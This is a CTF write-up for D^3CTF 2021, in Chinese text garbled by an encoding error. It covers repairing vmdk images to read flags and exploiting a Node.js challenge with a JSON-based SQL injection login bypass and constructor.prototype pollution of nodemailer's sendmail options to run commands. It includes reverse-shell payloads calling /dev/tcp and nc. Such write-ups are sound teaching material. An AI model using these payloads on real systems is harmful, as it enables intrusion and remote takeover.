è¿™ä¸ªå·¥å…·ï¼Œä½†æ˜¯è·‘äº† 10W+ çš„å­—å…¸éƒ½æ²¡è·‘å‡ºæ¥ï¼Œäºæ˜¯æ”¾å¼ƒã€‚ åˆæƒ³åˆ°èƒ½ä¸èƒ½ç›´æ¥å¯¼å…¥è™šæ‹Ÿæœºé•œåƒ vmdk å•Šï¼Œè¯•äº†è¯•è¿˜æ˜¯æŠ¥é”™äº†ã€‚ å†å»çœ‹çœ‹ VirtualLove-s00*.vmdk æ–‡ä»¶ï¼Œæ‰¾ä¸ªæ­£å¸¸çš„æ¯”å¯¹äº†ä¸€ä¸‹ï¼Œå¥½å®¶ä¼™ï¼Œå»æ‰äº†æ–‡ä»¶å¤´å•Šï¼ æ”¹å¥½æ–‡ä»¶å¤´ï¼Œå†ä¸€çœ‹è¿˜æ˜¯ä¸å¯¹å•Šï¼ï¼ï¼ å†æ¯”å¯¹äº†äº¿ä¸‹ï¼Œæ€ä¹ˆè¿˜å»æ‰äº†æ–‡ä»¶å¤´éƒ¨å¦å¤–ä¸€æ®µâ€¦â€¦ å—¯ï¼Œåˆ°è¿™é‡Œè¿˜æ˜¯æŠ¥é”™ã€‚ å†çœ‹ VirtualLove.vmdkï¼Œå‘ç°æŠŠ version æ ‡è®°ç»™æ•´æ²¡äº†ã€‚ åŠ ä¸Šï¼Œç»ˆäºèƒ½å¤Ÿæ­£å¸¸å¯åŠ¨äº†ã€‚ guest ç”¨æˆ·ç™»å½•ã€‚ åè€¶ï¼æœ‰å‡çš„ flagï¼ æç¤ºéœ€è¦è¿›å…¥ rootï¼Œäºæ˜¯è¯•ç€ææƒã€‚ åè€¶ï¼éƒ½æœ€æ–°ç‰ˆæœ¬äº†ï¼çœ‹ä¸Šå» setuid ææƒä¹Ÿä¸å¤§è¡Œã€‚/etc/passwd ä¹Ÿä¸å¯å†™ã€‚è®¡åˆ’ä»»åŠ¡ä¹Ÿä¸è¡Œã€‚ ï¼ˆæŸ¥äº†åŠå¤©æ€ä¹ˆææƒï¼Œæˆ‘å¥½èœå•Šå–µå‘œå‘œ Centosæ™®é€šç”¨æˆ·ææƒè‡³ROOT åˆ©ç”¨ /bin/ping rws ä¸­çš„ s çš„æ¼æ´ Linuxææƒï¼šä»å…¥é—¨åˆ°æ”¾å¼ƒ å¯¹Linux ææƒçš„ç®€å•æ€»ç»“ ã€å®‰å…¨ç§‘æ™®ã€‘Linuxææƒâ€”â€”åˆ©ç”¨å¯æ‰§è¡Œæ–‡ä»¶SUID etc. å‘ç°è²Œä¼¼ä¸€ä¸ªéƒ½æä¸äº†æƒã€‚ å†åæ¥ï¼Œæƒ³åˆ°æˆ‘æœ‰é•œåƒå•Šï¼Œä½•å¿…å‘¢ï¼æˆ‘å¯ä»¥æ”¹ root ç”¨æˆ·çš„å¯†ç å•Šã€‚ GitHub ä¸Šæ‰¾åˆ°äº†ä¸ª change-root-passwd å¯ä»¥å‚è€ƒ ä¿®æ”¹è™šæ‹Ÿæœºé•œåƒçš„rootå¯†ç  è¿™ç¯‡æ¥å®ç°ã€‚ å†è¿›ä¸€æ­¥ï¼Œæˆ‘éƒ½æœ‰é•œåƒäº†ï¼Œå•¥éƒ½èƒ½æå–çš„å•Šï¼å•Šæˆ‘æ˜¯åºŸç‰©å‘œå‘œå‘œã€‚ äºæ˜¯åˆæ‰¾åˆ°äº† Libguestfsï¼Œä¸€ä¸ªç”¨æ¥è®¿é—®å’Œä¿®æ”¹è™šæ‹Ÿæœºç£ç›˜é•œåƒçš„ä¸€ä¸ªå·¥å…·é›† è™šæ‹Ÿæœºé•œåƒç®¡ç†å·¥å…·â€“ Libguestfs CentOS7.1 KVMè™šæ‹ŸåŒ–ä¹‹libguestfs-toolså·¥å…·å¸¸ç”¨å‘½ä»¤ä»‹ç» apt install libguestfs-tools virt-ls VirtualLove.vmdk /root virt-cat VirtualLove.vmdk /root/flagggg.txt d3ctf{Vmw@RE_1s_5o_C0mpl3x_b99d1320cf} Virtual Love_Revenge Iâ€™m coming for revenge.You say you love me, but you donâ€™t know me at all! Your loveâ€¦Your love is all virtual!ï¼ˆLogin User: guestï¼‰The second part of the attachmentï¼šhttps://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Misc/VirtualLoveRevenge_cf424dd60a5d269b06ecfecfbd59deb9.part2.rarFlag Format: d3ctf{this_is_a_sample_flag} https://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Misc/VirtualLoveRevenge_cf424dd60a5d269b06ecfecfbd59deb9.part1.rar åˆæ˜¯ 6GiB çš„è™šæ‹Ÿæœºé•œåƒï¼Œå–‚ï¼Œè¿™æ¯”èµ›å äº†æˆ‘ç¡¬ç›˜å·¨å¤§ç©ºé—´å•Šå–‚ï¼ å¦å¤–è¿˜æœ‰ä¸ª true_flag.rar è¿™æ¬¡è¿˜æ˜¯ç…§æ ·æ”¹ VirtualLove-s00*.vmdk æ–‡ä»¶å¤´éƒ¨ã€‚ ä»¥åŠ VirtualLove.vmdk æ”¹çš„çœŸå¤š ç„¶åä¸€æ ·æ–°å»ºè™šæ‹Ÿæœºå¯¼å…¥é•œåƒã€‚ è¿˜æ˜¯ä¸€æ ·çš„å‡ flagã€‚ ç”¨ libguestfs-tools çœ‹çœ‹ /rootï¼Œç„¶åè¯»å–è¿™ä¸ªæ–‡ä»¶ã€‚ f5`FU2)I$F0Oc'qL@pP)S è¿™ä¸ªå°±æ˜¯å‹ç¼©åŒ…çš„å¯†ç ã€‚ è§£å‹æ‹¿åˆ° flag d3ctf{Vmw@RE_1s_5oooo_C0mpl3x_ec4bb60e58} å…¶å®è¿™é‡Œæˆ‘è¿˜å¯»æ€ç€æ˜¯ä¸æ˜¯æ¼äº†å•¥å‘¢ï¼Œæ˜¯ä¸æ˜¯è¿˜å¥—äº†å¥½å‡ æ­¥ï¼Œäºæ˜¯è¿˜æƒ³ç€æ”¹ root å¯†ç ï¼ˆï¼ˆ BTW, anaconda-ks.cfg è¿™ä¸ªæ–‡ä»¶é‡Œå°±å­˜äº† root çš„å¯†ç  Linux:rootä¸‹çš„æ–‡ä»¶-anaconda-ks.cfgè¯¦è§£ ä»¥åŠ é€šè¿‡ å•ç”¨æˆ·æ¨¡å¼ æˆ–è€… æ•‘æ´æ¨¡å¼ rescue mode å»æ›´æ”¹ root å¯†ç ã€‚ Linux å¿˜è®°å¯†ç è§£å†³æ–¹æ³• Linuxä¸­Rootå¯†ç ç ´è§£ Virtual Love_Revenge2.0 *Iâ€™m coming for revenge again.*You say you love me, but you donâ€™t know me at all! Your loveâ€¦Your love is all virtual!ï¼ˆLogin User: guestï¼‰The second part of the attachmentï¼šhttps://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Misc/VirtualLoveRevenge2.0_66a25efc5cbcf0b7a9fdab312c3e70aa.part2.rarFlag Format: d3ctf{this_is_a_sample_flag} https://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Misc/VirtualLoveRevenge2.0_66a25efc5cbcf0b7a9fdab312c3e70aa.part1.rar å–‚ï¼ï¼ï¼æœ‰å®Œæ²¡å®Œå•Šï¼å¤ªæœ‰æ¯’äº†ï¼ ï¼ˆæ€ä¹ˆè¿™æ¯”èµ›è¿™ä¹ˆå ç¡¬ç›˜ç©ºé—´ å…ˆæ˜¯å’Œä¸Šä¸€é¢˜ä¸€æ ·çš„æ“ä½œï¼Œåšçš„è¦åäº†â€¦â€¦ ç„¶åä¹‹åçœ‹å›¾ã€‚ å‹ç¼©åŒ…å¯†ç  2F!,O&lt;DJ+@&lt;*K0@&lt;6L(Df- d3ctf{Vmw@RE_1s_5ooo_C0mpl3x_[ç›®æ ‡æ–‡ä»¶md5]} d3ctf{Vmw@RE_1s_5ooo_C0mpl3x_8cf8463b34caa8ac871a52d5dd7ad1ef} å¥½è€¶ï¼Œæ˜¯ä¸€è¡€ï¼ ï¼ˆç›²çŒœæ˜¯ä¸æ˜¯ä¹‹å‰çš„é¢˜ç›®æœ‰äººç›´æ¥ grep / binwalk æˆ–è€…æ€ä¹ˆæ ·æå–åˆ°äº†å­—ç¬¦ä¸²ä»€ä¹ˆçš„å§ é—®äº†å‡ºé¢˜äººè¯´éé¢„æœŸæ˜¯ å‹ç¼©åŒ…çš„å¯†ç å’Œæœ€å¼€å§‹ç‰ˆæœ¬çš„ flag åœ¨åŒä¸€ä¸ªä½ç½®ï¼Œæ²¡è¿›è¡Œå…¶ä»–å¤„ç†ï¼Œæ‰€ä»¥ç›´æ¥å°±èƒ½åœ¨010é‡Œæ‰¾åˆ°ã€‚ é¢„æœŸè§£æ˜¯çˆ†ç ´ vmx çš„å¯†ç ï¼Œå­—å…¸éšå†™åœ¨ log é‡Œäº†ã€‚ç„¶åä¿®å¤ vmxï¼Œå†ä¿®ä¿®å…¶ä»–çš„å‡ ä¸ªæ–‡ä»¶å°±å¯ä»¥è¿›å»äº†ã€‚ emmmm Web8-bit pub Wellcome to 8-bit pub, take a seat and enjoy drinking here!Attachment: https://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Web/8-bit_pub_e7b8ca6dc23b59b42e8b5900b62c61506ad0ca34.zipPS: Try to execute /readflagPPS: The container restarts every 3 minutesFlag Format: d3ctf{this_is_a_sample_flag} Challenge Address http://6d5f59df15.8bit-pub.d3ctf.io ç»™äº†æºç ï¼Œç›´æ¥çœ‹ï¼Œæ˜¯ Nodejsã€‚ ç›²çŒœåˆæ˜¯åŸå‹é“¾æ±¡æŸ“ã€‚äºæ˜¯å°±å»æ‰¾æœ‰æ²¡æœ‰ã€‚ çœ‹äº†ä¸€ä¸‹ä¾èµ–çš„ç‰ˆæœ¬éƒ½æŒºæ–°çš„ï¼Œemmmã€‚ï¼ˆå¯ä»¥è¯•è¯• npm audit å‘ç°ç»™çš„æºç ä¸­å”¯ä¸€ä¸€å¤„å¯èƒ½çš„æ˜¯åœ¨å‘é‚®ä»¶è¿™é‡Œã€‚ controllers/adminController.js const send = require(\"../utils/mail\"); const shvl = require(\"shvl\"); module.exports = { home: function (req, res) { return res.sendView(\"admin.html\"); }, email: async function (req, res) { let contents = {}; Object.keys(req.body).forEach((key) =&gt; { shvl.set(contents, key, req.body[key]); }); contents.from = '\"admin\" &lt;admin@8-bit.pub&gt;'; try { await send(contents); return res.json({message: \"Success.\"}); } catch (err) { return res.status(500).json({ message: err.message }); } }, }; é€šè¿‡ shvl.set æŠŠæ¥æ”¶åˆ°çš„å‚æ•°èµ‹å€¼ç»™ contentsï¼Œä¹‹åå°±ä¼ è¿›å‘é‚®ä»¶çš„äº†ã€‚ é‚£æ€ä¹ˆè¿›å…¥è¿™ä¸ªå‘é‚®ä»¶å‘¢ï¼Ÿ æ ¹æ® routes/index.js å¯ä»¥çœ‹åˆ°è·¯ç”±ï¼Œéœ€è¦é‰´æƒï¼Œå°±æ˜¯ adminã€‚ const express = require(\"express\"); const router = express.Router(); const adminController = require(\"../controllers/adminController\"); const indexController = require(\"../controllers/indexController\"); const usersController = require(\"../controllers/usersController\"); const auth = require(\"../utils/auth\"); router.get(\"/\", indexController.home); router.get(\"/signin\", usersController.signinPage); router.get(\"/signup\", usersController.signupPage); router.get(\"/logout\", usersController.logout); router.get(\"/admin\", auth, adminController.home); router.post(\"/user/signin\", usersController.signin); router.post(\"/user/signup\", usersController.signup); router.post(\"/admin/email\", auth, adminController.email); module.exports = router; çœ‹ utils/auth.js let auth = function (req, res, next) { if (!req.session.username) { return res.redirect(302, \"/\"); } if (req.session.username !== \"admin\") { if (req.method === \"GET\") { return res.sendView(\"forbidden.html\"); } else { return res.json({ message: \"Forbidden.\" }); } } next(); }; module.exports = auth; éœ€è¦ session.username ä¸º adminã€‚é‚£é¦–å…ˆè¦ç™»å½•ã€‚ controllers/usersController.js const user = require(\"../modules/users\"); module.exports = { signinPage: function (req, res) { return res.sendView(\"signin.html\"); }, signupPage: function (req, res) { return res.sendView(\"signup.html\"); }, signin: function (req, res) { user.signin(req.body.username, req.body.password, function (err, result) { if (err) { return res.status(500).json({ message: err.message }); } if (result.length) { req.session.username = result[0].username; return res.json({ message: \"Signin success.\" }); } else { return res.status(401).json({ message: \"Username or password wrong.\" }); } }); }, signup: function (req, res) { user.signup(req.body.username, req.body.password, function (err, result) { if (err) { return res.status(500).json({ message: err.message }); } return res.json({ message: \"Signup success.\" }); }); }, logout: function (req, res) { req.session.username = undefined; return res.redirect(302, \"/\"); } }; å†çœ‹ modules/users.js const sql = require(\"../utils/db.js\"); module.exports = { signup: function (username, password, done) { sql.query( \"SELECT * FROM users WHERE username = ?\", [username], function (err, res) { if (err) { console.log(\"error: \", err); return done(err, null); } if (!res.length) { sql.query( \"INSERT INTO users VALUES (?, ?)\", [username, password], function (err, res) { if (err) { console.log(\"error: \", err); return done(err, null); } else { return done(null, res.insertId); } } ); } else { return done({ message: \"Username already taken.\" }, null); } }); }, signin: function (username, password, done) { sql.query( \"SELECT * FROM users WHERE username = ? AND password = ?\", [username, password], function (err, res) { if (err) { console.log(\"error: \", err); return done(err, null); } else { return done(null, res); } } ); }, }; è‰ï¼Œè¿˜è¦ SQL æ³¨å…¥â€¦â€¦ äºæ˜¯ æ€è·¯å°±æ˜¯é¦–å…ˆ SQL æ³¨å…¥ç™»å½• admin ç”¨æˆ·ï¼Œç„¶åé€šè¿‡å‘é‚®ä»¶çš„æ¥å£æ±¡æŸ“åŸå‹é“¾è¯»å– flagï¼Œæˆ–è€…åå¼¹ shell ä¹‹ç±»çš„ã€‚ ä½†æ˜¯æ³¨æ„çš„æ˜¯ï¼Œå®ƒè¿™é‡Œä¸æ˜¯æ‰‹åŠ¨æ‹¼æ¥çš„ SQL è¯­å¥ï¼Œåˆ©ç”¨ nodejs é‡Œçš„ mysql å°è£…å¥½çš„å‡½æ•°ï¼Œé€šè¿‡å ä½ç¬¦å’Œå‚æ•°æ¥è¿›è¡Œçš„ï¼Œè¿™æ ·ä¼šè‡ªåŠ¨è½¬ä¹‰å±é™©çš„å­—ç¬¦ã€‚ äºæ˜¯è¿™é‡Œè¯•äº†æŒºä¹…éƒ½æ²¡æ‰“é€šï¼ˆï¼ˆ ç½‘é¡µä¸Šè¯•äº†è¯•ï¼Œå‘ç°æ˜¯ urlencode ä¼ å‚ï¼Œä½†æ˜¯åœ¨ app.js ä¸­å¯ä»¥çŸ¥é“ json ä¹Ÿæ”¯æŒçš„ï¼Œé‚£å°±å¼€æ‰“ã€‚ SQL æ³¨å…¥ï¼Œä¸€èˆ¬çš„ç»•è¿‡éƒ½ä¸å¤§è¡Œï¼Œä½†æ˜¯åˆ©ç”¨ JavaScript çš„å¼±ç±»å‹å’Œ JSON çš„ç‰¹æ€§ï¼Œå¯ä»¥ä¼ å…¥ä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„ä¸œè¥¿ã€‚ å‚è€ƒï¼š nodejsåº”ç”¨ä¸­çš„æƒé™ç»•è¿‡æ¼æ´â€”ä¸€ä¸ªèµé‡‘æ¼æ´çš„æ•…äº‹ ä¸€é“æœ‰è¶£çš„å…³äºnodejsçš„ctfé¢˜ æ„é€ ç™»å½• payloadï¼Œæ‰“è¿‡å»ã€‚ {\"username\":[0], \"password\": true} {\"username\":[0], \"password\": [0]} å‘ç°ç¡®å®ç™»å½•æˆåŠŸäº†ï¼Œä½†æ˜¯çœ‹ä¸Šå»å¹¶ä¸æ˜¯ adminã€‚ å¯æ˜¯é˜Ÿå‹æœ¬åœ°æ­ç¯å¢ƒå‡ºæ¥ç¡®å®å¯è¡Œã€‚ ä¸çŸ¥é“æ˜¯æ•°æ®åº“ç¯å¢ƒçš„é—®é¢˜è¿˜æ˜¯ä»€ä¹ˆï¼ˆ åæ¥åˆè¯•äº†è¯•ï¼Œå‘ç° 0 1 4 5 ç­‰å¥½å‡ ä¸ªå€¼éƒ½èƒ½ç»•è¿‡ï¼ŒæˆåŠŸç™»å½•ï¼Œä½†éƒ½ä¸æ˜¯ adminã€‚ äºæ˜¯è€ƒè™‘ username è¿˜å¾—æ˜¯ adminã€‚ åœ¨ä¸æ–­åœ°å°è¯•ä¸‹ï¼Œæ„é€  {\"username\":\"admin\",\"password\":{\"password\":[1]}} ç”Ÿæˆçš„ SQL ä¸º SELECT * FROM users WHERE username = 'admin' AND password = `password` = 1 æ‰“è¿‡å»ï¼Œç»ˆäºæˆäº†ã€‚ æ¥ä¸‹æ¥å°± æ±¡æŸ“åŸå‹é“¾ã€‚ çœ‹äº†çœ‹ shvl é¡¹ç›®æ–‡æ¡£. ğŸš§ Get and set dot-notated properties within an object. å¯ä»¥é€šè¿‡ . æ¥ç´¢å¼•ï¼Œshvl.set(obj, 'a.b.c', 2); è¿™æ ·æ¥ç»™ object èµ‹å€¼ã€‚ æœ¬æ¥å…ˆæƒ³ç€åå¼¹ shellï¼Œå‘ç°ä¸è¡Œã€‚ {\"to\":\"xxx\",\"subject\":\"Weekend\",\"text\":\"Goodday\", \"__proto__\":{\"env\":{\"AAAA\":\"require(\\\"child_process\\\").exec(\\\"bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1\\\")//\", \"NODE_OPTIONS\":\"--require /proc/self/environ\"}}} //æˆ–è€… {\"to\":\"xxx\",\"subject\":\"Weekend\",\"text\":\"Goodday\", \"__proto__.env.AAAA\": \"require(\\\"child_process\\\").exec(\\\"bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1\\\")//\", \"__proto__.env.NODE_OPTIONS\":\"--require /proc/self/environ\"} åæ¥æƒ³åˆ°è¿™ä¸ªè²Œä¼¼éœ€è¦ fork è¿›ç¨‹æ‰èƒ½å®ç°ï¼Œäºæ˜¯ä¸è¡Œã€‚ï¼ˆå†åæ¥å‘ç°åˆå¯ä»¥äº†ï¼Œæœ‰ spawn ç„¶åå†è¯•äº†è¯•ï¼Œå‘ç°è²Œä¼¼ä¸èƒ½æ±¡æŸ“åŸå‹é“¾â€¦â€¦ï¼ˆï¼Ÿï¼Ÿï¼Ÿï¼‰ {\"to\":\"xxx\",\"subject\":\"Weekend\",\"text\":\"Goodday\", \"__proto__.html\":\"&lt;i&gt;Miao&lt;/i&gt;233333\"} è¿™ä¸ªæ‰“è¿‡å»æ”¶åˆ°çš„é‚®ä»¶é‡Œå¹¶ä¸æ˜¯ html ä¸­çš„å†…å®¹ï¼Œè¯´æ˜æ²¡æœ‰æ±¡æŸ“åˆ°ã€‚ å†å»çœ‹ utils/mail.js const nodemailer = require(\"nodemailer\"); async function send(contents) { let transporter = nodemailer.createTransport({ host: \"******\", // Plz use your own smtp server for testing. port: 25, tls: { rejectUnauthorized: false }, auth: { user: \"******\", pass: \"******\", }, }); return transporter.sendMail(contents); } module.exports = send; è°ƒç”¨äº† nodemailer è¿›è¡Œå‘é€ã€‚ æŸ¥çœ‹å…¶æ–‡æ¡£ Message configurationï¼Œå‘ç°æœ‰ä¸ª Attachmentsï¼Œå¯ä»¥å‘é™„ä»¶ï¼Œé‚£å°±è¯•è¯•èƒ½å¦æŠŠ flag å¸¦å‡ºæ¥ã€‚ {\"to\":\"xxx\",\"subject\":\"1\",\"text\":\"1\", \"attachments\": { \"path\": \"/readflag\" }} {\"to\":\"xxx\",\"subject\":\"1\",\"text\":\"1\", \"attachments\": { \"path\": \"/flag\" }} å¤±è´¥äº†ï¼Œæ²¡æœ‰æƒé™æ‰§è¡Œã€‚ ç„¶åè¯»äº†ç‚¹å…¶ä»–ä¸œè¥¿ï¼Œè¯•äº†ä¸‹å½“å‰ç›®å½•åœ¨ /var/www/web /proc/self/environ ç¯å¢ƒå˜é‡ ä»¥åŠ æ•°æ®åº“/session/mail çš„ä¸€äº›ä¿¡æ¯ï¼Œä½†æ˜¯ä¹Ÿæ²¡å•¥ç”¨å•Šã€‚ éš¾ä¸æˆ SMTP å»çªƒå–åˆ«äººçš„é™„ä»¶ï¼ˆæ²¡è¯•è¿‡ä¸çŸ¥é“è¡Œä¸è¡Œ 233 è¿™æ—¶å€™å†å›è¿‡æ¥çœ‹ shvl æºç  export function set (object, path, val, obj) { return !/__proto__/.test(path) &amp;&amp; ((path = path.split ? path.split('.') : path.slice(0)).slice(0, -1).reduce(function (obj, p) { return obj[p] = obj[p] || {}; }, obj = object)[path.pop()] = val), object; }; å™¢ï¼ŒåŸæ¥å®ƒæŠŠ __proto__ ç»™è¿‡æ»¤æ‰äº†ï¼Œéš¾æ€ªæ‰“ä¸é€šã€‚ ä½†æ˜¯è¿˜æœ‰ constructor: { prototype: { attachments: { path: '/readflag' } } } è¿™æ ·åº”è¯¥èƒ½ç»•è¿‡ã€‚ ç›´æ¥å†™å‘ç°æ²¡æœ‰é™„ä»¶ã€‚ è¿˜æ˜¯éœ€è¦ç”¨ . æ¥ã€‚ è¿™å›æ€è·¯å°±é€šäº†ï¼Œå°± æ‰¾æ±¡æŸ“å“ªé‡Œèƒ½æ‰§è¡Œä»£ç  å‘¢ã€‚ åˆå»ç¿» nodemailer çš„æºç ã€‚ æ ¹æ®æ–‡æ¡£ Sendmail transportï¼Œå‘ç°å¯ä»¥ä¼ ä¸ª args å‚æ•°ã€‚ è·Ÿè¿› send æºç  node_modules/nodemailer/lib/sendmail-transport/index.js#108 å¥½å®¶ä¼™ï¼ é‚£å°±æŠŠ path args ç»™æ±¡æŸ“å¥½äº†ã€‚ æ„é€ ä»£ç æˆä¸‹é¢è¿™æ ·ã€‚ const nodemailer = require(\"nodemailer\"); let transporter = nodemailer.createTransport({ sendmail: true, path: \"/bin/sh\", args: [\"-c\", \"touch /tmp/a\"], }); transporter.sendMail( { from: \"sender@example.com\", to: \"recipient@example.com\", subject: \"Message\", text: \"I hope this message gets delivered!\", }, (err, info) =&gt; { console.log(info.envelope); console.log(info.messageId); } ); å†å‚è€ƒ 2019 D^3 CTF-eztså¤ç° è¿™é¢˜åº”è¯¥æ‰§è¡Œ /readflag å°±èƒ½è¾“å‡º /flagã€‚ Payload: å…ˆæŠŠ flag è¯»å‡ºæ¥ï¼Œå†é€šè¿‡é™„ä»¶å‘é‚®ä»¶ã€‚ {\"to\":\"xxx\",\"subject\":\"/readflag test\",\"text\":\"/readflag test\", \"constructor.prototype.sendmail\": \"true\", \"constructor.prototype.path\": \"/bin/sh\", \"constructor.prototype.args\": [\"-c\",\"/readflag&gt;/tmp/miao\"]} {\"to\":\"xxx\",\"subject\":\"flag\",\"text\":\"temp\", \"constructor.prototype.attachments.path\": \"/tmp/miao\"} å‘ç°å†™çš„æ—¶å€™æŠ¥é”™ï¼Œä½†ç¡®å®å†™å…¥æ–‡ä»¶äº†ã€‚ æœ€ååœ¨ é‚®ä»¶é™„ä»¶é‡Œæ‹¿åˆ° flag d3ctf{01c185051349caebc42bf2a2bef08e9cca73b0f9bf680cf6406127081c6679eb} å“‡å‘œï¼ï¼ï¼ï¼ï¼ç»ˆäºå‡ºäº†ï¼ï¼ï¼ è¿™é¢˜å’Œé˜Ÿå‹ä»æ™šä¸Š 6.çœ‹åˆ° 11. å¤ªé¡¶äº†ï¼ å¯æ˜¯æ¯”èµ›ç»“æŸäº† å‘œå‘œå‘œ é—®é¢˜ä¸å¤§ï¼Œå­¦åˆ°äº†è®¸å¤šã€‚ BTW, è¯»äº†ä¸€ä¸‹æ ¹ç›®å½•ã€‚ total 876 drwxr-xr-x 1 root root 4096 Mar 5 05:08 . drwxr-xr-x 1 root root 4096 Mar 5 05:08 .. -rwxr-xr-x 1 root root 0 Mar 5 05:08 .dockerenv drwxr-xr-x 1 root root 4096 Feb 24 21:05 bin drwxr-xr-x 5 root root 340 Mar 6 04:35 dev drwxr-xr-x 1 root root 4096 Mar 5 16:10 etc ---------- 1 root root 71 Mar 5 03:52 flag drwxr-xr-x 1 root root 4096 Feb 24 21:05 home drwxr-xr-x 1 root root 4096 Feb 24 21:05 lib drwxr-xr-x 5 root root 4096 Feb 23 19:33 media drwxr-xr-x 2 root root 4096 Feb 23 19:33 mnt drwxr-xr-x 1 root root 4096 Feb 24 21:05 opt dr-xr-xr-x 222 root root 0 Mar 6 04:35 proc ---S-----x 1 root root 803240 Feb 27 07:56 readflag drwx------ 1 root root 4096 Mar 6 04:20 root drwxr-xr-x 1 root root 4096 Mar 7 00:21 run drwxr-xr-x 2 root root 4096 Feb 23 19:33 sbin drwxr-xr-x 2 root root 4096 Feb 23 19:33 srv dr-xr-xr-x 13 root root 0 Mar 6 04:35 sys drwxrwxrwt 1 root root 4096 Mar 7 15:25 tmp drwxr-xr-x 1 root root 4096 Feb 24 21:05 usr drwxr-xr-x 1 root root 4096 Mar 3 15:48 var readflag æœ‰ Så±æ€§ï¼Œèƒ½å¤Ÿä¸´æ—¶æå‡æƒé™æ¥è¯»å– flagã€‚ ä»£ç ç±»ä¼¼äº #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; void main() { seteuid(0); setegid(0); setuid(0); setgid(0); system(\"/bin/cat /flag\"); } çœ‹äº†å®˜æ–¹ WPï¼Œå‘ç°ç¡®å®æœ‰ä¸€ç§æ±¡æŸ“ç¯å¢ƒå˜é‡çš„æ–¹æ³•ã€‚ https://blog.p6.is/Abusing-Environment-Variables/ {\"constructor.prototype.env\": {\"NODE_DEBUG\": \"require('child_process').execSync('nc ip port -e/bin/sh')//\",\"NODE_OPTIONS\": \"-r /proc/self/environ\" },\"constructor.prototype.sendmail\": true,\"constructor.prototype.shell\": \"/bin/node\"} å°ç»“misc å…¶ä»–é¢˜ç›®çš„è¯ï¼Œæ¯”å¦‚ï¼š é‡å­å¯†é’¥åˆ†å‘ï¼ˆquantum key distributionï¼ŒQKDï¼‰ï¼Œç”¨çš„åº”è¯¥æ˜¯ BB84 åè®®ã€‚ ä¸è¿‡æµé‡åŒ…æå–ä¸å‡ºæ¥ï¼Œèµ›åæ‰å‘ç°ç¡®å®å°±æ˜¯ Python åºåˆ—åŒ–åçš„ï¼Œå¯ä»¥å¯¼å‡º JSON å†æå– data å†ååºåˆ—åŒ– ç½‘ä¸Šæ‰¾åˆ°çš„å‡ ä¸ª Google Capture The Flag 2019 (Quals) çš„ Writeupï¼š https://github.com/shahar603/CTF-Writeups/blob/master/2019/Google%20CTF%202019%20Quals/Quantum_Key_Distribution.md https://sasdf.github.io/ctf/writeup/2019/google/crypto/qkd/ https://ctftime.org/writeup/15844 https://ctftime.org/writeup/18212 çœ‹äº†å®˜æ–¹ wpï¼Œå¥½å®¶ä¼™ï¼Œpython æœ‰ä¸ª pyshark åŒ…èƒ½ç›´æ¥æå–å•Šâ€¦â€¦ è¿˜æœ‰ä¸ª Robust æ¯æ—¥ç½‘æ˜“äº‘ keep doctors away çš„ï¼Œç»™çš„æ˜¯ QUIC / HTTP3 çš„æµé‡åŒ…ï¼Œçœ‹ä¸Šå»åƒæ˜¯ m3u8 æ¨æµçš„æŠ“åŒ…ã€‚ å’Œå–µå–µæ˜¥èŠ‚é—¯å…³ Task2 çš„æ¨æµæœ‰ç‚¹åƒï¼ŒæŠ“äº†ä¸ªåŒ…å‘ç°ä¹Ÿç±»ä¼¼ã€‚ å…ˆåŠ è½½ SSLKEYLOGFILE å¾—åˆ°æ˜æ–‡æµé‡ï¼Œä½†æ˜¯ä¸ä¼šæå– QUICï¼Œå¤ªè‰äº† å¯ä»¥å¯¼å‡º JSON ç„¶åå†™ä¸ªè„šæœ¬æå–çš„ï¼Œå‘œå‘œå‘œï¼Œæˆ‘æ˜¯fwï¼ˆï¼ˆï¼ˆ çœ‹äº†å®˜æ–¹ wpï¼Œè‰ï¼Œè¿™é¢˜è¿™ä¹ˆå¥—å¨ƒçš„ä¹ˆã€‚ï¼ˆ æµé‡è§£å¯†å®Œæ˜¯åŠ å¯†çš„ m3u8 æµï¼Œæå–å‡ºå¯†é’¥ç”¨ aes-128-cbc è§£å¯†ï¼Œæ ¹æ®é¢‘è°±å‘ç°æ˜¯æ‹¨å·ä¸Šç½‘çš„è°ƒåˆ¶è§£è°ƒå™¨ï¼ˆmodemï¼‰ï¼Œè§£ç å®Œå¾—åˆ° base64 è§£å¯†å¾—åˆ°å‹ç¼©åŒ…ã€‚å†å»ç½‘æ˜“äº‘æ‰¾åˆ°ç›¸åŒæ­Œæ›²çš„æ­Œè¯ json è¿›è¡Œæ˜æ–‡æ”»å‡»ã€‚å¾—åˆ°çš„ txt æ–‡æ¡£å†…å®¹ç©ºç™½å­—ç¬¦éšå†™ï¼Œå† base85 è§£å¯†å¾—åˆ° flagã€‚ BTWï¼Œè¿˜æ‰¾äº†ç‚¹ QUIC ç›¸å…³çš„å·¥å…·ã€‚ a listing of tools for analysing, debugging and visualising QUIC (and potentially the HTTP mapping). See also the Implementations listing. qvis â€”â€” Toolsuite for visualizing QUIC+HTTP/3 qlog and pcap files. Includes a sequence diagram, congestion graph, multiplexing diagram and packetization visualization. ä¸€ä¸ª QUIC+HTTP/3 å¯è§†åŒ–çš„å·¥å…·ã€‚ï¼ˆGitHubï¼‰ æœ‰ä¸€é¢˜ shellgen2 æ˜¯è¾“å…¥ Python ä»£ç ï¼Œè¾“å‡º PHPã€‚éªŒè¯é€»è¾‘æ˜¯éšæœºäº§ç”Ÿä¸€æ®µå­—ç¬¦ä¸²ï¼Œæ‰§è¡Œ Python ä»£ç å¾—åˆ° PHP ä»£ç ï¼Œç„¶åç»è¿‡ waf ä¹‹åå†æ‰§è¡Œ PHPã€‚è²Œä¼¼ä¸ªé™åˆ¶é•¿åº¦çš„ æ— å­—æ¯æ•°å­— webshellã€‚ ï¼ˆå–µå–µè¿·èŒ« BTWï¼ŒrevshellgenStandalone script written in Python 3 for generating reverse shells easily without typing. It automates the boring stuff like URL encoding the command and setting up a listener.ä¸€ä¸ªè‡ªåŠ¨ç”Ÿæˆå¤šç§è¯­è¨€çš„åå¼¹ shell 